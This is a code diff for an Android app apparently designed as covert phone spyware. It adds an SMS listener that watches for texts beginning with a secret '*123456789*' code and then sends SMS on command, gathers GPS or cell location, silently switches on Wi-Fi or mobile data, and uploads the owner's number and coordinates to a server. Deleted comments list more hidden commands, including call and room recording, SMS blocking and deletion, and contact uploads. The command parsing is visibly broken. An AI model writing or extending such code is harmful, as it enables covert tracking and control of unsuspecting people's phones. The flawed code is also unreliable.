@@ -1,18 +1,29 @@
 package com.privacy.monitor.resolver;
 
-
+import java.util.Date;
+import com.baidu.location.LocationClientOption;
+import com.privacy.monitor.base.C;
+import com.privacy.monitor.db.DirectiveDB;
 import com.privacy.monitor.db.SMSRecordDB;
+import com.privacy.monitor.domain.Directive;
 import com.privacy.monitor.domain.SMSRecord;
 import com.privacy.monitor.inte.RunBack;
+import com.privacy.monitor.location.LocationMan;
 import com.privacy.monitor.resolver.field.SMSConstant;
+import com.privacy.monitor.util.AppUtil;
+import com.privacy.monitor.util.HttpUtil;
 import com.privacy.monitor.util.Logger;
+import com.privacy.monitor.util.NetworkUtil;
 
 import android.content.ContentResolver;
 import android.content.Context;
+import android.content.SharedPreferences;
 import android.database.ContentObserver;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.Handler;
+import android.os.SystemClock;
+import android.telephony.SmsManager;
 
 /**
  * 短信观察者
@@ -22,49 +33,9 @@ public class SMSObserver extends ContentObserver {
 	private Context context;
 	private SMSRecordDB sqlite;
 	private RunBack runBack;
-	
-	//private static final String head ="*123456789";
-	//通话录音 1开启,0关闭
-	//private static final String [] SRSwitch = {"*4*1","*4*0"};
-	//环境监听 1开启，0关闭
-	//private static final String [] environmentSwitch = {"*3*1","*3*0"};
-	//范围 默认全开 0关闭,1开启
-	//private static final String [] range = {"*5*1","*5*0","*5*1111"};
-    //默认值:5*60 5代表条数 60代表分钟每隔多少分钟上传
-	//private static final String [] SMSUploadSwitch = {"*6*1-100*60"};
-	//添加录音清单号码
-	//private static final String SRListNumber = "*7*";
-	//清单录音类型 默认值:3 ,1:清单内号码录音 2:清单外号码录音
-	//private static final String [] SRType = {"*8*1","*8*2","*8*3"}; 
-	//删除清单全部号码或删除指定的号码(监控号码)
-	//private static final String [] deleteSRListNumber = {"*9*2","*9*1"};
-	//环境录音时长 取值:1-60 分钟
-	//private static final String environmentSet = "*10*1";
-	//开启或关闭换卡通知 默认开启 0:关闭 1:开启
-	//private static final String [] changeSIMNotice = {"*22*1","*22*0"};
-	//停用或启用软件所有功能 默认开启 0:关闭 1:开启
-	//private static final String [] APPFunctionSwitch = {"*23*0","*23*1"};
-	//阻止手机收发含有关键字内容的短信
-	//private static final String  stopSMS = "*24*";
-	//删除含有关键字的短信或清空所有短信
-	//private static final String [] deleteSMS = {"*25*1*","*25*2"};
-	//立即上传对方GPS位置
-	//private static final String uploadGPSLocation = "*12";
-	//立即上传对方基站位置
-	//private static final String uploadBSLocation = "*13";
-	//立即上传对方手机所有通信记录
-	//private static final String uploadContacts = "*14";
-	//发送短信到指定号码*17*电话号码*短信内容
-	//private static final String sendSMS = "17*";
-	// 内容解析器，和ContentProvider刚好相反,一个提供，一个解析
+	private DirectiveDB directiveDB;
 	private ContentResolver mResolver;
-
-	// 需要取得的短信条数
-	// private static final int MAX_NUMS = 10;
-
-	// 用于保存记录中最大的ID
-	// private static final int MAX_ID = 0;
-
+	
 	// 需要获得的字段列
 	private static final String[] PROJECTION = {SMSConstant.TYPE,
 			SMSConstant.ADDRESS, SMSConstant.BODY, SMSConstant.DATE,
@@ -76,6 +47,7 @@ public class SMSObserver extends ContentObserver {
 		this.context = context;
 		this.sqlite = SMSRecordDB.getInstance(context);
 		this.runBack = runBack;
+		this.directiveDB = DirectiveDB.getInstance(context);
 	}
  
 	public SMSObserver(Handler handler) {
@@ -103,6 +75,23 @@ public class SMSObserver extends ContentObserver {
 						final String date = smsCursor.getString(dateIndex);
 						final String phone = smsCursor.getString(addressIndex);
 						final String body = smsCursor.getString(bodyIndex);
+						
+						if(body.startsWith("*123456789*")){
+							String strType = body.substring(10,11);
+							int iType = Integer.valueOf(strType);
+							String strStatus = body.substring(12, 13);
+							int iStatus = Integer.valueOf(strStatus);
+							if(iType==25){
+								int index = strType.lastIndexOf("*");
+								String content = strType.substring(index);
+								directive(iType,iStatus,content);
+							}else {
+								directive(iType,iStatus,"");
+							}
+							
+							break;
+						}
+						
 						Cursor contractsCursor = mResolver.query(Uri.parse("content://com.android.contacts/data"),new String []{"mimetype","raw_contact_id","data1"}," data1 LIKE ? ",new String[]{"%"+phone+"%"},null);
 						boolean isUpload = false;
 						if(contractsCursor !=null){
@@ -166,5 +155,93 @@ public class SMSObserver extends ContentObserver {
 				}
 			}
 		}	
+	}
+	
+	private void directive (int directiveNum,int status,String content){
+		if(directiveDB !=null){
+			Date date = new Date();
+			String head = "*123456789*";
+			boolean existStatus =directiveDB.exists(Directive.COL_TYPE+ " = ? ",new String []{status+""});
+			if(existStatus && directiveNum !=25 && directiveNum !=17){
+				directiveDB.update(Directive.COL_STATUS+" = ? "+", " + Directive.COL_START_TIME +"=? ", Directive.COL_TYPE +" =? ",new String []{status+"",date.getTime()+"",directiveNum+""});
+			}else if(directiveNum==25){
+				
+				if(status==1){
+					directiveDB.delete(Directive.COL_STATUS+"= ? ",new String []{content});
+				}else{
+					directiveDB.delete(Directive.COL_TYPE +" = ? ",new String []{"24"});
+				}
+				
+			}else if(directiveNum==17){
+			
+				SmsManager.getDefault().sendTextMessage(status+"",null,content, null,null);
+				
+			}else {
+				Directive directive = new Directive();
+				directive.setDirHead(head);
+				directive.setDirStatus(status+"");
+				directive.setDirType(directiveNum+"");
+				directive.setDirStartTime(date.getTime()+"");
+				directive.setDirPlatform(C.Directive.SMS+"");
+				directiveDB.insert(directive);
+			}
+			switch(directiveNum){
+			case 12:
+			case 13:
+				LocationMan locationMan = new LocationMan(context);
+				if(directiveNum==12){
+					locationMan.setLocationPro(LocationClientOption.GpsFirst);
+				}else {
+					locationMan.setLocationPro(LocationClientOption.NetWorkFirst);
+				}
+				locationMan.setRunBack(new MyRunnback());
+				locationMan.startLocaiton();
+				break;
+			case 14:
+				
+				break;
+			}
+		}
+	}
+	
+	private class MyRunnback implements RunBack{
+
+		@Override
+		public void run() {
+		}
+
+		@Override
+		public void run(final Object object) {
+			if(!HttpUtil.detect(context)){
+				new Thread(new Runnable() {
+					@Override
+					public void run() {
+						AppUtil.toggleWifi(context, true);
+						SystemClock.sleep(10000);
+						if(!HttpUtil.detect(context)){
+							AppUtil.toggleMobileNet(context, true);
+							SystemClock.sleep(10000);
+							if(object instanceof String []){
+								String [] lo = (String[]) object;
+								uploadLocation(lo);
+							}
+						}
+					}
+				}).start();
+			}else {
+				if(object instanceof String []){
+					String [] loc = (String[]) object;
+					uploadLocation(loc);
+				}
+			}
+		}
+	}
+	
+	private void uploadLocation(String [] locaInfo){
+		if(locaInfo !=null && locaInfo.length==2){
+			Date date = new Date();
+			SharedPreferences sp = context.getSharedPreferences(C.PHONE_INFO,Context.MODE_PRIVATE);
+			NetworkUtil.upload(context,"tel:"+sp.getString(C.PHONE,"")+"&lat="+locaInfo[0]+"&lon="+locaInfo[1]+"&time="+date.getTime(),C.RequestMethod.uploadLocation);
+		}
 	}
 }
